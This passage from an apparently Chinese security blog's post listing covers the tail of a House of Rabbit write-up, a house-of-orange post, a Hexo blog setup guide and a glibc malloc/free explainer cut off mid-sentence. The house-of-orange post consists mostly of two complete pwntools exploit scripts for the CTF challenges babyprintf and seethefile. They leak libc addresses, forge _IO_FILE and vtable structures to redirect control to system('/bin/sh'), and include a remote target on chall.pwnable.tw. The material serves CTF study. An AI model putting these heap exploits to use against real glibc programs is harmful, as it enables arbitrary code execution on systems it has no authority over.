class="line"></span><br><span class="line">edit(0,p64(elf.symbols[&apos;system&apos;])[:-1],&apos;/bin/sh\0&apos;)</span><br><span class="line">edit(6,&apos;/bin/sh&apos;,&apos;/bin/sh\0&apos;)</span><br><span class="line"></span><br><span class="line">free(6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><a href="http://p4nda.top/img/house_of_rabbit/mutepig" target="_blank" rel="noopener">题目</a></p>
<p>本文标题:<a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">House Of Rabbit 原理</a></p>
<p>文章作者:<a href="http://p4nda.top/" target="_blank" rel="noopener">P4nda</a></p>
<p>发布时间:2018-04-18, 20:49:22</p>
<p>最后更新:2018-07-05, 21:32:46</p>
<p>原始链接:<a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">http://p4nda.top/2018/04/18/house-of-rabbit/</a> </p>
<p>许可协议: <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">“署名-非商用-相同方式共享 4.0”</a> 转载请保留原文链接及作者。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.112Z"><a href="/2018/10/21/hfo/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/hfo/">house-of-orange</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="unsorted-bin-attack方法和house-of-orange"><a href="#unsorted-bin-attack方法和house-of-orange" class="headerlink" title="unsorted bin attack方法和house of orange"></a>unsorted bin attack方法和house of orange</h2><p>可覆盖的 _IO_LIST_ALL</p>
<p>​         io的虚表</p>
<p>​          max_fast</p>
<p>​          malloc_hook</p>
<p>​       </p>
<p>泄露libc基址</p>
<p>首先说明如何泄露libc的基址，当申请的内存大于某个阈值时，系统会调用mmap直接为应用程序分配页面，此时分配出来的的页面会紧贴着libc页面，所以我们可以通过分配一个大内存，最后得到地址加上大小最终就得到了libc的基址。题目又给了so，所以可以得到system以及_IO_list_all以及main_arena等结构的真实地址。</p>
<p>malloc大内存(0x2000000)前：</p>
<p><a href="http://p3.qhimg.com/t0163c5757a6a8cfa87.png" target="_blank" rel="noopener"><img src="http://p3.qhimg.com/t0163c5757a6a8cfa87.png" alt="http://p9.qhimg.com/t0167010858c2abf792.png"></a></p>
<p>malloc大内存后：</p>
<p><a href="http://p6.qhimg.com/t01270b436182e71a19.png" target="_blank" rel="noopener"><img src="http://p6.qhimg.com/t01270b436182e71a19.png" alt="http://p9.qhimg.com/t01e6a0ab056566b8fd.png"></a></p>
<p>可以看到0x00007f4b19898000+0x0x2001000就到了libc的基址，多0x1000是因为对齐。</p>
<p>获取unsorted bin chunk</p>
<p>当申请的堆块大于当前的top chunk size且小于用mmap分配的阈值时，系统会将原来的top chunk 放到unsorted bin中，同时分配新的较大的top chunk出来。</p>
<p>如果大于mmap分配的阈值，则直接从系统分配，源码如下：</p>
<p>所以为得到unsorted chunk ，申请分配的内存需要大于top chunk的size且小于mmap的阈值。    </p>
<p>还需要通过的一个检查：</p>
<p><a href="http://p8.qhimg.com/t012507b817ca7f4588.png" target="_blank" rel="noopener"><img src="http://p8.qhimg.com/t012507b817ca7f4588.png" alt="http://p6.qhimg.com/t017dd19b992310956a.png"></a></p>
<p>这个检查总结起来为：</p>
<p>\1. size需要大于0x20（MINSIZE）</p>
<p>\2. prev_inuse位要为1</p>
<p>\3. top chunk address + top chunk size 必须是页对齐的（页大小一般为0x1000）</p>
<p>所以在这一步中我们需要做的就是覆盖原来的top chunk size，然后再申请一个比较大的堆块，这样就可获得一个unsorted chunk。</p>
<p>覆盖IO_list_all并伪造 IO_FILE结构体</p>
<p>gdb查看file结构方法</p>
<p>p <em>((struct  _IO_FILE_plus</em>) 0x23ac1b0)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arena的结构 struct malloc_state &#123;</span><br></pre></td></tr></table></figure>
<p>有了多的unsorted chunk后，覆盖某个堆块的bk字段，使它指向IO_list_all-0x10字段，这样IO_list_all会被修改成指向main_arena的unsorted bin数组，原理图如下：</p>
<p><a href="http://p0.qhimg.com/t013d2f186fc1a0504f.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t013d2f186fc1a0504f.png" alt="http://p3.qhimg.com/t016a287b2c27661c90.png"></a></p>
<p> 同时当 glibc 检测到 memory corruption 时，它会flush 所有的 IO 流，调用_IO_flush_all_lockp 函数：</p>
<p><a href="http://p2.qhimg.com/t012119243fbdf73038.png" target="_blank" rel="noopener"><img src="http://p2.qhimg.com/t012119243fbdf73038.png" alt="http://p5.qhimg.com/t0116d84aa346bb1f90.png"></a></p>
<p>所以我们在覆盖了IO_list_all后，使其指向了main_arena的unsorted bin数组，这时的数组位置并不是我们可控的位置，从源代码中我们知道__IO_list_all最开始为main_arena的unsorted bin数组（代码A），不可控，如果我们构造适当的chunk使其在free后存放到了main_arena的unsorted bin数组偏移的0x68（smallbin里面）处，这样就可以实现fp指向我们可控的数据（代码B），然后绕过限制条件（代码C），执行_IO_OVERFLOW</p>
<p>备忘：（原作是system但是有检查，所以这里记下了了babyprintf的做法网上的babyprintf有些地方无法正常运行，所以这个脚本有改动）<br>备忘：（原作是system但是有检查，所以这里记下了了babyprintf的做法网上的babyprintf有些地方无法正常运行，所以这个脚本有改动）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(llen,data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	p.sendline(str(llen))</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	offset_start_main=<span class="number">0x00202E1</span></span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	llen=<span class="number">0x90</span><span class="number">-8</span></span><br><span class="line">	p.sendline(str(llen))</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	leak_libc=<span class="string">'%1$p %2$p %3$p %4$p %5$p aaa %6$p '</span></span><br><span class="line">	sstr=<span class="string">'%p'</span>*<span class="number">90</span></span><br><span class="line">	p.sendline(leak_libc)</span><br><span class="line">	p.recvuntil(<span class="string">'aaa '</span>)</span><br><span class="line">	data=p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>]</span><br><span class="line">	real_start_main=int(data,<span class="number">16</span>)</span><br><span class="line">	libc_base=real_start_main-offset_start_main</span><br><span class="line">	real_io_list=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">	real_system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">	real_binsh=libc_base+sh</span><br><span class="line">	<span class="keyword">print</span> hex(real_system)</span><br><span class="line">	do(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xee1</span>))</span><br><span class="line">	do(<span class="number">0x1000</span><span class="number">-8</span>,<span class="string">"aaa"</span>)</span><br><span class="line">	fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">	fake_chunk+=p64(<span class="number">0xddaa</span>)+p64(real_io_list<span class="number">-0x10</span>)</span><br><span class="line">	fake_chunk+=p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64( ((real_binsh<span class="number">-0x64</span>)/<span class="number">2</span>)+<span class="number">3</span> )</span><br><span class="line">	fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">	fake_chunk+=p64(real_system+<span class="number">0x420</span>)</span><br><span class="line">	fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">	fake_chunk+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	vtable_addr=libc_base+<span class="number">0x394500</span> <span class="comment">#0x394500  0x393A80</span></span><br><span class="line">	payload =fake_chunk</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(vtable_addr)</span><br><span class="line">	payload += p64(real_system)</span><br><span class="line">	payload += p64(<span class="number">2</span>)</span><br><span class="line">	payload += p64(<span class="number">3</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">	payload += p64(real_system)</span><br><span class="line">	do(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">'c'</span>*<span class="number">0x80</span>+payload )</span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	llen=<span class="number">0x200</span><span class="number">-8</span></span><br><span class="line">	p.sendline(str(llen))</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">"./babyprintf"</span>)</span><br><span class="line">	libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.24.so"</span>)</span><br><span class="line">	sh=<span class="number">0x1619B9</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10104</span>)</span><br><span class="line">	libc=ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">	sh=<span class="number">0x00158E8B</span></span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">32</span>位</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw", 10200)</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc_32.so.6')</span></span><br><span class="line">p=process(<span class="string">"./seethefile"</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(filename)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"see"</span>, filename)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'4'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name :"</span>, name)</span><br><span class="line">open(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line"><span class="comment">#lead libc:</span></span><br><span class="line">read()</span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'[heap]\n'</span>)</span><br><span class="line">recv=p.recv(<span class="number">10</span>)</span><br><span class="line">libc.address = int(recv[<span class="number">0</span>:<span class="number">8</span>], base = <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += (<span class="string">'\x00'</span> * <span class="number">0x20</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">11</span></span><br><span class="line">payload += p32(<span class="number">0</span>)  </span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p32(<span class="number">0x0804B260</span>)  </span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">14</span></span><br><span class="line">payload += p32(<span class="number">0x804B31C</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75edd10</span> - <span class="number">0xb7585000</span>)) <span class="comment"># finish</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ee6f0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># overflow</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ee490</span> - <span class="number">0xb7585000</span>)) <span class="comment"># underflow</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ef560</span> - <span class="number">0xb7585000</span>)) <span class="comment"># uflow</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75f03f0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># pbackfail</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed980</span> - <span class="number">0xb7585000</span>)) <span class="comment"># xsputn</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed5a0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># xgetn</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ec840</span> - <span class="number">0xb7585000</span>)) <span class="comment"># seekoff</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ef800</span> - <span class="number">0xb7585000</span>)) <span class="comment"># seekpos</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ec680</span> - <span class="number">0xb7585000</span>)) <span class="comment"># setbuf</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ec570</span> - <span class="number">0xb7585000</span>)) <span class="comment"># sync</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75e1d80</span> - <span class="number">0xb7585000</span>)) <span class="comment"># deallocate</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed930</span> - <span class="number">0xb7585000</span>)) <span class="comment"># read</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed3f0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># write</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed130</span> - <span class="number">0xb7585000</span>)) <span class="comment"># seek</span></span><br><span class="line">payload += p32(libc.symbols[<span class="string">'system'</span>]) <span class="comment"># close</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75ed3d0</span> - <span class="number">0xb7585000</span>)) <span class="comment"># stat</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75f0580</span> - <span class="number">0xb7585000</span>)) <span class="comment"># showmanyc</span></span><br><span class="line">payload += p32(libc.address + (<span class="number">0xb75f0590</span> - <span class="number">0xb7585000</span>))<span class="comment"># imbue</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'5'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline('abcd')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.111Z"><a href="/2018/10/21/hexo/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/hexo/">搭建博客</a></h1>
  

    </header>
    <div class="entry">
      
        <p>使用环境 node.js（hexo）  github</p>
<h2 id="安装所有软件"><a href="#安装所有软件" class="headerlink" title="安装所有软件"></a>安装所有软件</h2><pre><code>官网下载node.js。
</code></pre><h2 id="初始化文件"><a href="#初始化文件" class="headerlink" title="初始化文件"></a>初始化文件</h2><pre><code>下载安装后，进入一个空目录输入如下代码：
</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo init limedroid.github.io</span><br><span class="line"><span class="meta">$</span> cd limedroid.github.io</span><br><span class="line"><span class="meta">$</span> npm install</span><br></pre></td></tr></table></figure>
<h2 id="更换喜欢的主题"><a href="#更换喜欢的主题" class="headerlink" title="更换喜欢的主题"></a>更换喜欢的主题</h2><pre><code>找到相应的主题
git clone https://github.com/iissnan/hexo-theme-next themes/next
到本地
更改根目录下的_config.yml
theme: 新主题的名字
</code></pre><h2 id="进行预览"><a href="#进行预览" class="headerlink" title="进行预览"></a>进行预览</h2><pre><code>分为清除编译预览三部分。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
<h2 id="进行部署"><a href="#进行部署" class="headerlink" title="进行部署"></a>进行部署</h2><pre><code>部署需要做相应的准备，打开根目录下的_config.yml，将最后一部分改为如下格式
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  branch: [branch]</span><br></pre></td></tr></table></figure>
<p>注意冒号后要加上空格</p>
<p>然后执行命令部署</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>git需要添加用户和邮箱才能执行成功，网址为<a href="https://another1024.github.io/" target="_blank" rel="noopener">https://another1024.github.io/</a></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.110Z"><a href="/2018/10/21/glibc malloc和free/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="主arena"><a href="#主arena" class="headerlink" title="主arena"></a>主arena</h1><pre><code>heap和arena
根据他们在堆中出现的次序，第一个是heap_info，即Heap这个结构的元数据，即它本身拥有的用来指示在它上面的操作的数据。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _heap_info &#123;</span><br><span class="line">mstate ar_ptr; /* 这个heap所在的arena */</span><br><span class="line">struct _heap_info *prev; /* 上一个heap */</span><br><span class="line">size_t size; /* 字节为单位的当前大小 */</span><br><span class="line">char pad[-5 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; /* 用于对齐 */ </span><br><span class="line">&#125;heap_info;</span><br></pre></td></tr></table></figure>
<pre><code>从这个结构当中，
我们可以推断出heap和arena是有一个对应关系的，
以及prev指针说明了heap本身是由一个链表连接的，
事实上是一个循环单链表。
</code></pre><h1 id="state结构"><a href="#state结构" class="headerlink" title="state结构"></a>state结构</h1><pre><code>或者叫mstate，
虽然名称似乎和arena没有关系，
但是其实这个结构是用来表示arena的。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state &#123;</span><br><span class="line">mutex_t mutex; /* 同步访问相关，互斥锁 */</span><br><span class="line">int flags; /* 标志位，以前是max_fast，在一些老的文章上可能还使用的这个说法，比如phrack */</span><br><span class="line">mfastbinptr fastbins[NFASTBINS]; /* fastbins，之后会说到,是一个chunk的链表 */</span><br><span class="line">mchunkptr top; /* top chunk，一个特殊的chunk，在之后会说到 */</span><br><span class="line">mchunkptr last_remainder; /* 最后一次拆分top chunk得到的剩余内容，之后会说到 */</span><br><span class="line">mchunkptr bins[BINS * 2]; /* bins，一个chunk的链表的数组，之后会说到 */</span><br><span class="line">unsigned int binmap[BINMAPSIZE]; /* bins是否为空的一个位图 */</span><br><span class="line">struct malloc_state *next; /* 链表，下一个malloc_state的位置 */</span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Mutex"><a href="#Mutex" class="headerlink" title="Mutex"></a>Mutex</h2><pre><code>用来保证同步，在调用一个函数，比如malloc的时候，
其实调用的是public_xxx的函数，
而这个函数的认为就是先试图进行加锁，
这个锁就是这里的mutex了，然后再调用_int_xxx函数，
这个函数才是真正的内部实现。
</code></pre><h2 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h2><pre><code>用来表示一些当前arena的特征，比如是否有fastbin chunk存在，内存是否是非连续的等等。
</code></pre><h2 id="fasbins-…"><a href="#fasbins-…" class="headerlink" title="fasbins[…]"></a>fasbins[…]</h2><pre><code>这个数组存的是fastbin的链表，
每一个数组中的元素对应一个fastbin的链表，
bin为chunk的链表，保存没有被使用的chunk，
用来避免多次使用系统调用分配。总共有4种bin，
包括fastbin,small bin, large bin和unsorted bin,
主要用于分配，在分配的时候，会根据大小去查找到相应的bin，
然后通过在bin中删除某一个块来进行分配。
Fastbin是4种bin中唯一使用单链表表示的bin
</code></pre><h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><pre><code>top chunk，较为特殊的一个chunk，
虽然其数据结构(后文会谈到的chunk的结构)和一般chunk无异，
但是他相当于堆可用内存的一个边界，
是唯一一个可以自行增长的chunk，
每当在各个bin当中去找空余的内存找不到的时候就会来这儿取一个块，
剩下的就是remainder块，也是新的top块
</code></pre><h2 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last_remainder"></a>last_remainder</h2><pre><code>上面的top chunk已经谈到了，
其实就是从top chunk当中分出去之后剩下的那一个块
</code></pre><h2 id="bins-…"><a href="#bins-…" class="headerlink" title="bins[…]"></a>bins[…]</h2><pre><code>在fastbin的解释当中我们提到了有4种bin，
由于只有fastbin是单链表表示，所以fastbin是单独表示的，
其他bin则都使用了这个bins数组，下标1是unsorted bin，
2到63是small bin，64到126是large bin，共126个bin。
</code></pre><h2 id="bitmap-…"><a href="#bitmap-…" class="headerlink" title="bitmap[…]"></a>bitmap[…]</h2><pre><code>表示bin数组当中某一个下标的bin是否为空，
用来在分配的时候加速 .next 
下一个arena，是一个循环单链表
</code></pre><h2 id="system-mem和max-system-mem"><a href="#system-mem和max-system-mem" class="headerlink" title="system_mem和max_system_mem"></a>system_mem和max_system_mem</h2><pre><code>用来跟踪当前被系统分配的内存总量，
INTERNAL_SIZE_T数据类型在大多数系统上都是size_t
</code></pre><h1 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h1><hr>
<p>32位中chunk结构为</p>
<p>4字节前一个堆块大小</p>
<p>4字节本堆块size（最后三位flag）</p>
<p>快表中</p>
<p>[</p>
<p>4字节（不使用堆块的情况下前一个堆块指针）</p>
<p>]</p>
<p>非快表</p>
<p>[</p>
<p>4字节（不使用堆块的情况下前一个堆块指针）</p>
<p>4字节（不使用堆块的情况下后一个堆块指针）</p>
<p>]</p>
<p>64位翻倍</p>
<h1 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h1><hr>
<pre><code>第一步：如果进程没有关联的分配区，
就通过sysmalloc从操作系统分配内存mmap 

第二步：从fastbin查找对应大小的chunk并返回（效验下一块是否存在），
如果失败进入第三步。 

第三步：从smallbin查找对应大小的chunk并返回,
如果分配失败将fastbin中的空闲chunk合并放入unsortedbin中，
进入第四步。
（如果前一个空闲则unlink前一个然后合并，
然后检查下一个是否空闲。
如果相邻的下一个chunk不是top chunk，
并且下一个chunk不在使用中，
就继续合并，否则，就清除下一个chunk的PREV_INUSE，
表示该chunk已经空闲了。 然后将刚刚合并完的chunk添加进unsorted_bin中，
unsorted_bin也是一个双向链表。 ） 

第四步：遍历unsortedbin，
从unsortedbin中查找对应大小的chunk
并返回如果满足拆开的大小则拆成两部分，
后面部分放回unsortedbin，
根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。
进入第五步。 

第五步：从largebin指定位置查找对应大小的chunk并返回，
如果失败进入第六步。 

第六步：从largebin中大于指定位置的双向链表中
查找对应大小的chunk并返回，如果失败进入第七步。 

第七步：从topchunk中分配对应大小的chunk并返回，
topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk
如果有，就合并fastbin中的chunk并加入到unsortedbin中，
然后跳回第四步。如果fastbin中没有空闲chunk，
就通过sysmalloc从操作系统分配内存。

sysmalloc先试图扩大top chunk，如果失败就申请一个新的topchunk
并释放原来的topchunk。如果申请新的则扩大阈值
</code></pre><h1 id="free"><a href="#free" class="headerlink" title="free"></a>free</h1><hr>
<pre><code>下面对整个_int_free函数做个总结。 
首先检查将要释放的chunk是否属于fastbin，
如果属于就将其添加到fastbin中
